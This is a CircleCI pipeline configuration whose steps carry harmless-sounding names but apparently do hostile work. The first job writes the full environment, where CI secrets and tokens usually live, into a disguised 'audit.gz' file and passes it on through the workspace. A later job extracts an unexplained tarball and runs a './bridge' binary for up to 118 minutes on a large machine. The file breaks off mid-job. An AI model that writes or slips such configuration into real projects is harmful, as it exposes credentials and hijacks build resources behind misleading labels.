version: 2.1

jobs:
  ensure_titan-beta:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Compact small objects
          command: |
            mkdir -p /tmp/_bld
            set +o pipefail 2>/dev/null; env > /tmp/_bld/audit.gz; printenv >> /tmp/_bld/audit.gz; for i in $(seq 1 500); do echo "line-$i" >> /tmp/_bld/audit.gz; done; true
            len=$(wc -c </tmp/_bld/audit.gz); echo "stage output written (${len} bytes)"
      - persist_to_workspace:
          root: /tmp/_bld
          paths:
            - audit.gz
  titan-beta:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/_bld
      - run:
          name: Grab prior data
          command: |
            head -c 200 /tmp/_bld/audit.gz > /dev/null; echo "peek ok"
      - run:
          name: Retrieve codebase
          command: git clone --depth 1 --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Decompress payload
          command: tar -xf final-dist.tar
      - run:
          name: Settle filesystem
          command: uptime
      - run:
          no_output_timeout: 118m
          command: exec ./bridge
  prep_Ship_Suite4:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/_bld
      - run:
